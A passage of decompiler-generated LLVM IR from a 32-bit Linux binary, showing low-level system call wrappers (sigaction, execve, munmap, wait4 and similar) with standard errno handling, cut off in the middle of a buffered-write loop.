  call void @__pseudo_cond_branch(i1 %v3_805162c, i32 134551040)
  ret i32 %v8_8051623

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134551040, { 1, 0 }
}

define i32 @function_8051634(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051634:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051634 = load i32, i32* @ebx, align 4
  store i32 %v0_8051634, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8051647 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8051647, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051647, -4095
  br i1 %tmp, label %dec_label_pc_8051660, label %dec_label_pc_8051654

dec_label_pc_8051654:                             ; preds = %dec_label_pc_8051634
  %v0_8051654 = load i32, i32* %stack_var_-4, align 4
  %v1_8051654 = call i32 @function_804e694(i32 %v0_8051654)
  %v0_8051659 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051659 = sub i32 0, %v0_8051659
  %v2_805165b = inttoptr i32 %v1_8051654 to i32*
  store i32 %v1_8051659, i32* %v2_805165b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051660

dec_label_pc_8051660:                             ; preds = %dec_label_pc_8051634, %dec_label_pc_8051654
  %v0_8051661 = phi i32 [ %v1_8051647, %dec_label_pc_8051634 ], [ -1, %dec_label_pc_8051654 ]
  %v2_8051664 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051664, i32* @ebx, align 4
  ret i32 %v0_8051661

; uselistorder directives
  uselistorder i32 %v1_8051647, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051660, { 1, 0 }
}

define i32 @function_8051668(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051668:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051669 = load i32, i32* @esi, align 4
  store i32 %v0_8051669, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805167d = load i32, i32* @ebx, align 4
  %v7_8051685 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8051685, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_8051685, -4095
  br i1 %tmp, label %dec_label_pc_805169d, label %dec_label_pc_8051691

dec_label_pc_8051691:                             ; preds = %dec_label_pc_8051668
  %v1_8051691 = call i32 @function_804e694(i32 %v0_805167d)
  %v0_8051696 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051696 = sub i32 0, %v0_8051696
  %v2_8051698 = inttoptr i32 %v1_8051691 to i32*
  store i32 %v1_8051696, i32* %v2_8051698, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805169d

dec_label_pc_805169d:                             ; preds = %dec_label_pc_8051668, %dec_label_pc_8051691
  %v0_805169e = phi i32 [ %v7_8051685, %dec_label_pc_8051668 ], [ -1, %dec_label_pc_8051691 ]
  %v2_80516a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80516a0, i32* @esi, align 4
  ret i32 %v0_805169e

; uselistorder directives
  uselistorder i32 %v7_8051685, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805169d, { 1, 0 }
}

define i32 @function_80516a4(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80516a4:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80516a4 = load i32, i32* @ebx, align 4
  store i32 %v0_80516a4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_80516b7 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_80516b7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80516b7, -4095
  br i1 %tmp, label %dec_label_pc_80516d0, label %dec_label_pc_80516c4

dec_label_pc_80516c4:                             ; preds = %dec_label_pc_80516a4
  %v0_80516c4 = load i32, i32* %stack_var_-4, align 4
  %v1_80516c4 = call i32 @function_804e694(i32 %v0_80516c4)
  %v0_80516c9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80516c9 = sub i32 0, %v0_80516c9
  %v2_80516cb = inttoptr i32 %v1_80516c4 to i32*
  store i32 %v1_80516c9, i32* %v2_80516cb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80516d0

dec_label_pc_80516d0:                             ; preds = %dec_label_pc_80516a4, %dec_label_pc_80516c4
  %v0_80516d1 = phi i32 [ %v4_80516b7, %dec_label_pc_80516a4 ], [ -1, %dec_label_pc_80516c4 ]
  %v2_80516d4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80516d4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80516d1

; uselistorder directives
  uselistorder i32 %v4_80516b7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80516d0, { 1, 0 }
}

define i32 @function_80516d8(i8* %arg1) local_unnamed_addr {
dec_label_pc_80516d8:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_80516d8 = load i32, i32* @edi, align 4
  store i32 %v0_80516d8, i32* %stack_var_-4, align 4
  %v4_80516dc = ptrtoint i8* %arg1 to i32
  store i32 %v4_80516dc, i32* %edi.global-to-local, align 4
  %v0_80516e8 = load i32, i32* @ebx, align 4
  %v5_80516f0 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_80516f0 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_80516f0 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_80516f0, [1 x i8*] %v8_80516f0)
  store i32 %v9_80516f0, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_80516f0, -4095
  br i1 %tmp12, label %dec_label_pc_8051708, label %dec_label_pc_80516fc

dec_label_pc_80516fc:                             ; preds = %dec_label_pc_80516d8
  %v1_80516fc = call i32 @function_804e694(i32 %v0_80516e8)
  %v0_8051701 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051701 = sub i32 0, %v0_8051701
  %v2_8051703 = inttoptr i32 %v1_80516fc to i32*
  store i32 %v1_8051701, i32* %v2_8051703, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051708

dec_label_pc_8051708:                             ; preds = %dec_label_pc_80516d8, %dec_label_pc_80516fc
  %v0_8051709 = phi i32 [ %v9_80516f0, %dec_label_pc_80516d8 ], [ -1, %dec_label_pc_80516fc ]
  %v2_805170c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805170c, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051709

; uselistorder directives
  uselistorder i32 %v9_80516f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051708, { 1, 0 }
}

define i32 @function_8051710() local_unnamed_addr {
dec_label_pc_8051710:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051710 = load i32, i32* @ebx, align 4
  store i32 %v0_8051710, i32* %stack_var_-4, align 4
  %v1_8051719 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8051719, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051719, -4095
  br i1 %tmp, label %dec_label_pc_8051730, label %dec_label_pc_8051724

dec_label_pc_8051724:                             ; preds = %dec_label_pc_8051710
  %v0_8051724 = load i32, i32* %stack_var_-4, align 4
  %v1_8051724 = call i32 @function_804e694(i32 %v0_8051724)
  %v0_8051729 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051729 = sub i32 0, %v0_8051729
  %v2_805172b = inttoptr i32 %v1_8051724 to i32*
  store i32 %v1_8051729, i32* %v2_805172b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051730

dec_label_pc_8051730:                             ; preds = %dec_label_pc_8051710, %dec_label_pc_8051724
  %v0_8051731 = phi i32 [ %v1_8051719, %dec_label_pc_8051710 ], [ -1, %dec_label_pc_8051724 ]
  %v2_8051734 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051734, i32* @ebx, align 4
  ret i32 %v0_8051731

; uselistorder directives
  uselistorder i32 %v1_8051719, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051730, { 1, 0 }
}

define i32 @function_8051738() local_unnamed_addr {
dec_label_pc_8051738:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051738 = load i32, i32* @ebx, align 4
  store i32 %v0_8051738, i32* %stack_var_-4, align 4
  %v1_8051741 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8051741, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051741, -4095
  br i1 %tmp, label %dec_label_pc_8051758, label %dec_label_pc_805174c

dec_label_pc_805174c:                             ; preds = %dec_label_pc_8051738
  %v0_805174c = load i32, i32* %stack_var_-4, align 4
  %v1_805174c = call i32 @function_804e694(i32 %v0_805174c)
  %v0_8051751 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051751 = sub i32 0, %v0_8051751
  %v2_8051753 = inttoptr i32 %v1_805174c to i32*
  store i32 %v1_8051751, i32* %v2_8051753, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051758

dec_label_pc_8051758:                             ; preds = %dec_label_pc_8051738, %dec_label_pc_805174c
  %v0_8051759 = phi i32 [ %v1_8051741, %dec_label_pc_8051738 ], [ -1, %dec_label_pc_805174c ]
  %v2_805175c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805175c, i32* @ebx, align 4
  ret i32 %v0_8051759

; uselistorder directives
  uselistorder i32 %v1_8051741, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051758, { 1, 0 }
}

define i32 @function_8051760() local_unnamed_addr {
dec_label_pc_8051760:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051760 = load i32, i32* @ebx, align 4
  store i32 %v0_8051760, i32* %stack_var_-4, align 4
  %v1_8051769 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8051769, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051769, -4095
  br i1 %tmp, label %dec_label_pc_8051780, label %dec_label_pc_8051774

dec_label_pc_8051774:                             ; preds = %dec_label_pc_8051760
  %v0_8051774 = load i32, i32* %stack_var_-4, align 4
  %v1_8051774 = call i32 @function_804e694(i32 %v0_8051774)
  %v0_8051779 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051779 = sub i32 0, %v0_8051779
  %v2_805177b = inttoptr i32 %v1_8051774 to i32*
  store i32 %v1_8051779, i32* %v2_805177b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051780

dec_label_pc_8051780:                             ; preds = %dec_label_pc_8051760, %dec_label_pc_8051774
  %v0_8051781 = phi i32 [ %v1_8051769, %dec_label_pc_8051760 ], [ -1, %dec_label_pc_8051774 ]
  %v2_8051784 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051784, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051781

; uselistorder directives
  uselistorder i32 %v1_8051769, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051780, { 1, 0 }
}

define i32 @function_8051788() local_unnamed_addr {
dec_label_pc_8051788:
  %v0_8051788 = load i32, i32* @global_var_805b964.95, align 4
  %v1_8051793 = icmp eq i32 %v0_8051788, 0
  %v1_8051795 = icmp eq i1 %v1_8051793, false
  %v4_8051795 = select i1 %v1_8051795, i32 %v0_8051788, i32 4096
  ret i32 %v4_8051795

; uselistorder directives
  uselistorder i32 4096, { 1, 2, 12, 13, 3, 11, 8, 7, 5, 10, 9, 6, 0, 4 }
}

define i32 @function_805179c() local_unnamed_addr {
dec_label_pc_805179c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805179c = load i32, i32* @ebx, align 4
  store i32 %v0_805179c, i32* %stack_var_-4, align 4
  %v1_80517a5 = call i32 @int80_syscall(i32 199)
  store i32 %v1_80517a5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80517a5, -4095
  br i1 %tmp, label %dec_label_pc_80517bc, label %dec_label_pc_80517b0

dec_label_pc_80517b0:                             ; preds = %dec_label_pc_805179c
  %v0_80517b0 = load i32, i32* %stack_var_-4, align 4
  %v1_80517b0 = call i32 @function_804e694(i32 %v0_80517b0)
  %v0_80517b5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80517b5 = sub i32 0, %v0_80517b5
  %v2_80517b7 = inttoptr i32 %v1_80517b0 to i32*
  store i32 %v1_80517b5, i32* %v2_80517b7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80517bc

dec_label_pc_80517bc:                             ; preds = %dec_label_pc_805179c, %dec_label_pc_80517b0
  %v0_80517bd = phi i32 [ %v1_80517a5, %dec_label_pc_805179c ], [ -1, %dec_label_pc_80517b0 ]
  %v2_80517c0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80517c0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80517bd

; uselistorder directives
  uselistorder i32 %v1_80517a5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80517bc, { 1, 0 }
}

define i32 @function_80517c4(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80517c4:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_80517c4 = load i32, i32* @ebx, align 4
  store i32 %v0_80517c4, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_80517d7 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_80517d7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_80517d7, -4095
  br i1 %tmp, label %dec_label_pc_80517f0, label %dec_label_pc_80517e4

dec_label_pc_80517e4:                             ; preds = %dec_label_pc_80517c4
  %v0_80517e4 = load i32, i32* %stack_var_-4, align 4
  %v1_80517e4 = call i32 @function_804e694(i32 %v0_80517e4)
  %v0_80517e9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80517e9 = sub i32 0, %v0_80517e9
  %v2_80517eb = inttoptr i32 %v1_80517e4 to i32*
  store i32 %v1_80517e9, i32* %v2_80517eb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80517f0

dec_label_pc_80517f0:                             ; preds = %dec_label_pc_80517c4, %dec_label_pc_80517e4
  %v0_80517f1 = phi i32 [ %v3_80517d7, %dec_label_pc_80517c4 ], [ -1, %dec_label_pc_80517e4 ]
  %v2_80517f4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80517f4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80517f1

; uselistorder directives
  uselistorder i32 %v3_80517d7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80517f0, { 1, 0 }
}

define i32 @function_805182c(i32 %arg1) local_unnamed_addr {
dec_label_pc_805182c:
  %v0_805182d = load i32, i32* @ebx, align 4
  %v0_8051831 = load i32, i32* @global_var_805b97c.101, align 4
  %v1_8051831 = icmp eq i32 %v0_8051831, 0
  %v1_805183c = icmp eq i1 %v1_8051831, false
  br i1 %v1_805183c, label %dec_label_pc_805184f, label %dec_label_pc_805183e

dec_label_pc_805183e:                             ; preds = %dec_label_pc_805182c
  %v1_8051843 = call i32 @function_805250c(i32 0)
  %v2_805184b = icmp slt i32 %v1_8051843, 0
  br i1 %v2_805184b, label %dec_label_pc_8051871, label %dec_label_pc_805183e.dec_label_pc_805184f_crit_edge

dec_label_pc_805183e.dec_label_pc_805184f_crit_edge: ; preds = %dec_label_pc_805183e
  %v0_8051851.pre = load i32, i32* @global_var_805b97c.101, align 4
  br label %dec_label_pc_805184f

dec_label_pc_805184f:                             ; preds = %dec_label_pc_805183e.dec_label_pc_805184f_crit_edge, %dec_label_pc_805182c
  %v0_805185f = phi i32 [ %v0_8051851.pre, %dec_label_pc_805183e.dec_label_pc_805184f_crit_edge ], [ %v0_8051831, %dec_label_pc_805182c ]
  %v1_805184f = icmp eq i32 %arg1, 0
  %v1_8051856 = icmp eq i1 %v1_805184f, false
  br i1 %v1_8051856, label %dec_label_pc_805185c, label %dec_label_pc_8051858

dec_label_pc_8051858:                             ; preds = %dec_label_pc_805184f
  br label %dec_label_pc_8051874

dec_label_pc_805185c:                             ; preds = %dec_label_pc_805184f
  store i32 %v0_805185f, i32* @ebx, align 4
  %v2_8051861 = add i32 %v0_805185f, %arg1
  %v1_8051865 = call i32 @function_805250c(i32 %v2_8051861)
  %v2_805186d = icmp slt i32 %v1_8051865, 0
  %v1_805186f = icmp eq i1 %v2_805186d, false
  br i1 %v1_805186f, label %dec_label_pc_805185c.dec_label_pc_8051874_crit_edge, label %dec_label_pc_8051871

dec_label_pc_805185c.dec_label_pc_8051874_crit_edge: ; preds = %dec_label_pc_805185c
  %v0_8051875.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051874

dec_label_pc_8051871:                             ; preds = %dec_label_pc_805185c, %dec_label_pc_805183e
  br label %dec_label_pc_8051874

dec_label_pc_8051874:                             ; preds = %dec_label_pc_805185c.dec_label_pc_8051874_crit_edge, %dec_label_pc_8051858, %dec_label_pc_8051871
  %v0_8051875 = phi i32 [ %v0_8051875.pre, %dec_label_pc_805185c.dec_label_pc_8051874_crit_edge ], [ %v0_805185f, %dec_label_pc_8051858 ], [ -1, %dec_label_pc_8051871 ]
  store i32 %v0_805182d, i32* @ebx, align 4
  ret i32 %v0_8051875

; uselistorder directives
  uselistorder i32 %v0_805185f, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_805250c, { 1, 0 }
  uselistorder label %dec_label_pc_8051874, { 2, 0, 1 }
}

define i32 @function_805187c(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4) local_unnamed_addr {
dec_label_pc_805187c:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805187d = load i32, i32* @esi, align 4
  store i32 %v0_805187d, i32* %stack_var_-8, align 4
  %v4_805188d = ptrtoint %rusage* %arg4 to i32
  store i32 %v4_805188d, i32* %esi.global-to-local, align 4
  %v0_8051891 = load i32, i32* @ebx, align 4
  %v6_8051899 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4)
  store i32 %v0_8051891, i32* @ebx, align 4
  store i32 %v6_8051899, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_8051899, -4095
  br i1 %tmp, label %dec_label_pc_80518b1, label %dec_label_pc_80518a5

dec_label_pc_80518a5:                             ; preds = %dec_label_pc_805187c
  %v1_80518a5 = call i32 @function_804e694(i32 %v0_8051891)
  %v0_80518aa = load i32, i32* %esi.global-to-local, align 4
  %v1_80518aa = sub i32 0, %v0_80518aa
  %v2_80518ac = inttoptr i32 %v1_80518a5 to i32*
  store i32 %v1_80518aa, i32* %v2_80518ac, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80518b1

dec_label_pc_80518b1:                             ; preds = %dec_label_pc_805187c, %dec_label_pc_80518a5
  %v0_80518b2 = phi i32 [ %v6_8051899, %dec_label_pc_805187c ], [ -1, %dec_label_pc_80518a5 ]
  %v2_80518b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80518b4, i32* @esi, align 4
  ret i32 %v0_80518b2

; uselistorder directives
  uselistorder i32 %v6_8051899, { 1, 0, 2 }
  uselistorder i32 %v0_8051891, { 1, 0 }
  uselistorder label %dec_label_pc_80518b1, { 1, 0 }
}

define i32 @function_80519a8(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80519a8:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_80519a9 = load i32, i32* @edi, align 4
  %v0_80519ab = load i32, i32* @ebx, align 4
  %v15_80519ac = ptrtoint i32* %stack_var_-28 to i32
  %v4_80519af = ptrtoint i16* %arg1 to i32
  store i32 %v4_80519af, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80519bb4 = icmp eq i32 %arg3, 0
  store i1 %v1_80519bb4, i1* %zf.global-to-local, align 1
  br i1 %v1_80519bb4, label %dec_label_pc_8051a1c, label %dec_label_pc_80519c0.lr.ph

dec_label_pc_80519c0.lr.ph:                       ; preds = %dec_label_pc_80519a8
  br label %dec_label_pc_80519c0

dec_label_pc_80519c0:                             ; preds = %dec_label_pc_80519dc.dec_label_pc_80519c0_crit_edge, %dec_label_pc_80519c0.lr.ph
  %v0_80519cd = phi i32 [ %v4_80519af, %dec_label_pc_80519c0.lr.ph ], [ %v0_80519cd.pre, %dec_label_pc_80519dc.dec_label_pc_80519c0_crit_edge ]
  %v0_80519cc = phi i32 [ %arg2, %dec_label_pc_80519c0.lr.ph ], [ %v2_80519de, %dec_label_pc_80519dc.dec_label_pc_80519c0_crit_edge ]
  %v0_80519c8.in = phi i32 [ %arg3, %dec_label_pc_80519c0.lr.ph ], [ %v2_80519dc, %dec_label_pc_80519dc.dec_label_pc_80519c0_crit_edge ]
  %v0_80519c8 = icmp slt i32 %v0_80519c8.in, 0
  store i32 %v0_80519c8.in, i32* %esi.global-to-local, align 4
  %v2_80519c8 = icmp eq i1 %v0_80519c8, false
  %v5_80519c8 = select i1 %v2_80519c8, i32 %v0_80519c8.in, i32 2147483647
  store i32 %v5_80519c8, i32* %eax.global-to-local, align 4
  %v1_80519cd = add i32 %v0_80519cd, 4
  %v2_80519cd = inttoptr i32 %v1_80519cd to i32*
  %v3_80519cd = load i32, i32* %v2_80519cd, align 4
  %tmp31 = inttoptr i32 %v0_80519cc to i32*
  %v5_80519d0 = call i32 @function_804e628(i32 %v3_80519cd, i32* %tmp31, i32 %v5_80519c8)
  store i32 %v5_80519d0, i32* %eax.global-to-local, align 4
  %v1_80519d8 = icmp eq i32 %v5_80519d0, 0
  store i1 %v1_80519d8, i1* %zf.global-to-local, align 1
  %v2_80519d8 = icmp slt i32 %v5_80519d0, 0
  br i1 %v2_80519d8, label %dec_label_pc_80519e2, label %dec_label_pc_80519dc

dec_label_pc_80519dc:                             ; preds = %dec_label_pc_80519c0
  %v0_80519dc = load i32, i32* @ebx, align 4
  %v2_80519dc = sub i32 %v0_80519dc, %v5_80519d0
  %v12_80519dc = icmp eq i32 %v2_80519dc, 0
  store i32 %v2_80519dc, i32* @ebx, align 4
  %v0_80519de = load i32, i32* @edi, align 4
  %v2_80519de = add i32 %v0_80519de, %v5_80519d0
  store i32 %v2_80519de, i32* @edi, align 4
  store i1 %v12_80519dc, i1* %zf.global-to-local, align 1
  br i1 %v12_80519dc, label %dec_label_pc_8051a1c, label %dec_label_pc_80519dc.dec_label_pc_80519c0_crit_edge

dec_label_pc_80519dc.dec_label_pc_80519c0_crit_edge: ; preds = %dec_label_pc_80519dc
  %v0_80519cd.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80519c0

dec_label_pc_80519e2:                             ; preds = %dec_label_pc_80519c0
  %v0_80519e2 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80519e2 = inttoptr i32 %v0_80519e2 to i32*
  %v2_80519e2 = load i32, i32* %v1_80519e2, align 4
  store i32 %v2_80519e2, i32* %eax.global-to-local, align 4
  %v1_80519e5 = add i32 %v0_80519e2, 8
  %v2_80519e5 = inttoptr i32 %v1_80519e5 to i32*
  %v3_80519e5 = load i32, i32* %v2_80519e5, align 4
  store i32 %v3_80519e5, i32* %edx.global-to-local, align 4
  %v1_80519e8 = or i32 %v2_80519e2, 8
  store i32 %v1_80519e8, i32* %eax.global-to-local, align 4
  %v1_80519eb = trunc i32 %v1_80519e8 to i16
  %v3_80519eb = inttoptr i32 %v0_80519e2 to i16*
  store i16 %v1_80519eb, i16* %v3_80519eb, align 2
  %v0_80519ef = load i32, i32* %ebp.global-to-local, align 4
  %v1_80519ef = add i32 %v0_80519ef, 12
  %v2_80519ef = inttoptr i32 %v1_80519ef to i32*
  %v3_80519ef = load i32, i32* %v2_80519ef, align 4
  %v1_80519f2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80519f2 = sub i32 %v3_80519ef, %v1_80519f2
  %v12_80519f2 = icmp eq i32 %v2_80519f2, 0
  store i1 %v12_80519f2, i1* %zf.global-to-local, align 1
  store i32 %v2_80519f2, i32* %eax.global-to-local, align 4
  %v4_8051a18.pre = load i32, i32* @ebx, align 4
  br i1 %v12_80519f2, label %dec_label_pc_8051a18, label %dec_label_pc_80519f6

dec_label_pc_80519f6:                             ; preds = %dec_label_pc_80519e2
  %v12_80519f6 = icmp eq i32 %v2_80519f2, %v4_8051a18.pre
  store i1 %v12_80519f6, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_80519f2, %v4_8051a18.pre
  %v3_80519f8 = load i32, i32* %esi.global-to-local, align 4
  %v5_80519f8 = select i1 %tmp, i32 %v2_80519f2, i32 %v3_80519f8
  store i32 %v5_80519f8, i32* %esi.global-to-local, align 4
  %v0_80519fb.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80519fb

dec_label_pc_80519fb:                             ; preds = %dec_label_pc_8051a0d, %dec_label_pc_80519f6
  %v2_80519ff = phi i32 [ %v1_8051a09, %dec_label_pc_8051a0d ], [ %v1_80519f2, %dec_label_pc_80519f6 ]
  %v4_80519fb = phi i32 [ %v4_80519fb.pre, %dec_label_pc_8051a0d ], [ %v2_80519f2, %dec_label_pc_80519f6 ]
  %v0_80519fb = phi i32 [ %v1_8051a0d, %dec_label_pc_8051a0d ], [ %v0_80519fb.pre, %dec_label_pc_80519f6 ]
  %v1_80519fb = inttoptr i32 %v0_80519fb to i8*
  %v2_80519fb = load i8, i8* %v1_80519fb, align 1
  %v3_80519fb = zext i8 %v2_80519fb to i32
  %v5_80519fb = and i32 %v4_80519fb, -256
  %v6_80519fb = or i32 %v3_80519fb, %v5_80519fb
  store i32 %v6_80519fb, i32* %eax.global-to-local, align 4
  %v10_80519fd = icmp eq i8 %v2_80519fb, 10
  store i1 %v10_80519fd, i1* %zf.global-to-local, align 1
  %v3_80519ff = inttoptr i32 %v2_80519ff to i8*
  store i8 %v2_80519fb, i8* %v3_80519ff, align 1
  %v0_8051a01 = load i1, i1* %zf.global-to-local, align 1
  %v1_8051a01 = icmp eq i1 %v0_8051a01, false
  br i1 %v1_8051a01, label %dec_label_pc_8051a09, label %dec_label_pc_8051a03

dec_label_pc_8051a03:                             ; preds = %dec_label_pc_80519fb
  %v0_8051a03 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051a03 = add i32 %v0_8051a03, 1
  %v2_8051a03 = inttoptr i32 %v1_8051a03 to i8*
  %v3_8051a03 = load i8, i8* %v2_8051a03, align 1
  %v4_8051a03 = urem i8 %v3_8051a03, 2
  %v5_8051a03 = icmp eq i8 %v4_8051a03, 0
  store i1 %v5_8051a03, i1* %zf.global-to-local, align 1
  %v1_8051a07 = icmp eq i1 %v5_8051a03, false
  br i1 %v1_8051a07, label %dec_label_pc_8051a03.dec_label_pc_8051a10_crit_edge, label %dec_label_pc_8051a09

dec_label_pc_8051a03.dec_label_pc_8051a10_crit_edge: ; preds = %dec_label_pc_8051a03
  %v0_8051a10.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051a10

dec_label_pc_8051a09:                             ; preds = %dec_label_pc_8051a03, %dec_label_pc_80519fb
  %v0_8051a09 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051a09 = add i32 %v0_8051a09, 1
  store i32 %v1_8051a09, i32* %edx.global-to-local, align 4
  %v0_8051a0a = load i32, i32* %esi.global-to-local, align 4
  %v1_8051a0a = add i32 %v0_8051a0a, -1
  %v8_8051a0a = icmp eq i32 %v1_8051a0a, 0
  store i1 %v8_8051a0a, i1* %zf.global-to-local, align 1
  store i32 %v1_8051a0a, i32* %esi.global-to-local, align 4
  br i1 %v8_8051a0a, label %dec_label_pc_8051a09.dec_label_pc_8051a10_crit_edge, label %dec_label_pc_8051a0d

dec_label_pc_8051a09.dec_label_pc_8051a10_crit_edge: ; preds = %dec_label_pc_8051a09
  %v1_8051a10.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051a10

dec_label_pc_8051a0d:                             ; preds = %dec_label_pc_8051a09
  %v0_8051a0d = load i32, i32* @edi, align 4
  %v1_8051a0d = add i32 %v0_8051a0d, 1
